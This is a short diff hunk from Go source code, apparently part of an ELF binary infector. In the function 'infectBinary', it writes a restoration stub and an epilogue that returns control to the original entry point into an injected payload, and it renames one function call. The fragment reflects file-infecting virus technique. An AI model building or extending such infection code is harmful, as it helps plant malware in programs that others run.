@@ -193,7 +193,7 @@ func (t *targetBin) infectBinary(debug bool) error {
 				}
 
 				t.Payload.Write(restoration64)
-				retStub = modEpilogue64(int32(t.Payload.Len() + 5), t.Hdr.(*elf.Header64).Entry, oEntry64)
+				retStub = modEpilogue(int32(t.Payload.Len() + 5), t.Hdr.(*elf.Header64).Entry, oEntry64)
 				t.Payload.Write(retStub)
 				
 				if debug {
